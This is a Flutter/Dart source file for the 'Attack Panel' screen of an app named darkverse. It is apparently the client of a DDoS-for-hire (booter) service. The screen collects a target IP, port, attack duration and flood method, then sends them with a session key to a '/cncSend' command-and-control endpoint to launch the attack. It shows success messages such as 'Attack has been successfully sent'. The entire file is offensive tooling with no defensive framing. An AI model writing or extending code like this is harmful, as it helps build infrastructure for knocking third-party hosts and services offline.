import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'attack_countdown_overlay.dart';
import 'api.dart';
import 'package:darkverse/theme/app_theme.dart';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();

  late AnimationController _controller;
  String selectedDoosId = "";
  double attackDuration = 60;
  bool _isSending = false;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    if (widget.listDoos.isNotEmpty) {
      final first = widget.listDoos[0];
      selectedDoosId = first['ddos_id']?.toString() ?? '';
    }
  }

  Future<void> _sendDoos() async {
    if (_isSending) return;
    setState(() => _isSending = true);

    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      _showAlert("Invalid Input", "Target IP cannot be empty.");
      setState(() => _isSending = false);
      return;
    }

    if (selectedDoosId.isEmpty) {
      _showAlert("No Method", "Please select an attack method.");
      setState(() => _isSending = false);
      return;
    }

    if (selectedDoosId != "icmp" && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("Invalid Port", "Please input a valid port.");
      setState(() => _isSending = false);
      return;
    }

    final encodedTarget = Uri.encodeComponent(target);
    final encodedKey = Uri.encodeComponent(key);

    await AttackCountdownOverlay.show(
      context,
      targetName: "$target:$port",
      onComplete: () async {
        try {
          final uri = Uri.parse(
              "${ApiConfig.baseUrl}/cncSend?key=$encodedKey&target=$encodedTarget&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
          final res = await http.get(uri);
          final data = jsonDecode(res.body);

          if (!mounted) return;
          if (data["cooldown"] == true) {
            _showAlert("Cooldown", "Please wait a moment before sending again.");
          } else if (data["valid"] == false) {
            _showAlert("Invalid Key", "Your session key is invalid. Please log in again.");
          } else if (data["sended"] == false) {
            _showAlert("Failed", "Failed to send attack. The server may be under maintenance.");
          } else {
            _showAlert("Success", "Attack has been successfully sent to $target.");
          }
        } catch (_) {
          if (mounted) {
            _showAlert("Error", "An unexpected error occurred. Please try again.");
          }
        }
        if (mounted) setState(() => _isSending = false);
      },
    );
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.bgCard,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(AppTheme.radiusM),
          side: const BorderSide(color: AppTheme.borderSubtle),
        ),
        title: Text(title, style: AppTheme.headingM),
        content: Text(msg, style: AppTheme.bodyM),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK", style: TextStyle(color: AppTheme.teal)),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    return Scaffold(
      backgroundColor: AppTheme.bgDeep,
      appBar: AppBar(
        backgroundColor: AppTheme.bgDeep,
        surfaceTintColor: Colors.transparent,
        elevation: 0,
        title: Text("Attack Panel", style: AppTheme.headingM),
        centerTitle: true,
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            children: [
              FadeTransition(
                opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                child: ClipOval(
                  child: Image.asset(
                    'assets/images/logo.png',
                    width: 120,
                    height: 120,
                    fit: BoxFit.cover,
                  ),
                ),
              ),
              const SizedBox(height: 20),
              Text("Target Input & Methods", style: AppTheme.headingM),
              const Divider(color: AppTheme.borderSubtle, thickness: 0.6),
              const SizedBox(height: 25),

              _buildInputCard(
                icon: Icons.computer,
                title: "Target IP",
                child: TextField(
                  controller: targetController,
                  style: const TextStyle(color: AppTheme.textPrimary),
                  cursorColor: AppTheme.teal,
                  decoration: _inputStyle("Target IP (e.g. 1.1.1.1)"),
                ),
              ),
              const SizedBox(height: 20),

              _buildInputCard(
                icon: Icons.wifi_tethering,
                title: "Port",
                child: TextField(
                  controller: portController,
                  enabled: !isIcmp,
                  keyboardType: TextInputType.number,
                  style: TextStyle(color: isIcmp ? AppTheme.textMuted : AppTheme.textPrimary),
                  cursorColor: isIcmp ? AppTheme.textMuted : AppTheme.teal,
                  decoration: _inputStyle(
                    isIcmp ? "ICMP does not use port" : "Port (e.g. 80)",
                    isIcmp: isIcmp,
                  ),
                ),
              ),
              const SizedBox(height: 20),

              _buildInputCard(
                icon: Icons.timer,
                title: "Attack Duration",
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text("⏱ ${attackDuration.toInt()} seconds",
                        style: AppTheme.bodyL),
                    Slider(
                      value: attackDuration,
                      min: 10,
                      max: 300,
                      divisions: 29,
                      label: "${attackDuration.toInt()}s",
                      activeColor: AppTheme.teal,
                      inactiveColor: AppTheme.borderSubtle,
                      onChanged: (value) {
                        setState(() => attackDuration = value);
                      },
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              _buildInputCard(
                icon: Icons.flash_on,
                title: "Attack Method",
                child: DropdownButtonHideUnderline(
                  child: DropdownButton<String>(
                    dropdownColor: AppTheme.bgCard,
                    value: selectedDoosId.isEmpty ? null : selectedDoosId,
                    isExpanded: true,
                    iconEnabledColor: AppTheme.teal,
                    style: const TextStyle(color: AppTheme.textPrimary),
                    hint: Text("Select method", style: TextStyle(color: AppTheme.teal)),
                    items: widget.listDoos.where((d) => d['ddos_id']?.toString().isNotEmpty == true).map((doos) {
                      return DropdownMenuItem<String>(
                        value: doos['ddos_id'].toString(),
                        child: Text(
                          (doos['ddos_name'] ?? 'Unknown').toString(),
                          style: const TextStyle(color: AppTheme.textPrimary),
                        ),
                      );
                    }).toList(),
                    onChanged: (value) {
                      if (value != null) {
                        setState(() => selectedDoosId = value);
                      }
                    },
                  ),
                ),
              ),
              const SizedBox(height: 40),

              SizedBox(
                width: double.infinity,
                child: ElevatedButton.icon(
                  onPressed: _isSending ? null : _sendDoos,
                  icon: _isSending
                      ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2, color: AppTheme.textPrimary))
                      : const Icon(Icons.bolt, color: AppTheme.bgDeep),
                  label: Text(
                    _isSending ? "SENDING..." : "LAUNCH ATTACK",
                    style: const TextStyle(
                      fontSize: 16,
                      fontWeight: FontWeight.w800,
                      letterSpacing: 1.2,
                      color: AppTheme.bgDeep,
                    ),
                  ),
                  style: AppTheme.primaryButton(AppTheme.teal),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: AppTheme.accentCardDecor(AppTheme.teal),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, color: AppTheme.teal, size: 20),
              const SizedBox(width: 8),
              Text(title, style: AppTheme.headingS),
            ],
          ),
          const SizedBox(height: 10),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: isIcmp ? AppTheme.textMuted : AppTheme.teal),
      filled: true,
      fillColor: AppTheme.bgInput,
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? AppTheme.textMuted : AppTheme.borderSubtle),
        borderRadius: BorderRadius.circular(AppTheme.radiusM),
      ),
      focusedBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? AppTheme.textMuted : AppTheme.teal),
        borderRadius: BorderRadius.circular(AppTheme.radiusM),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }
}
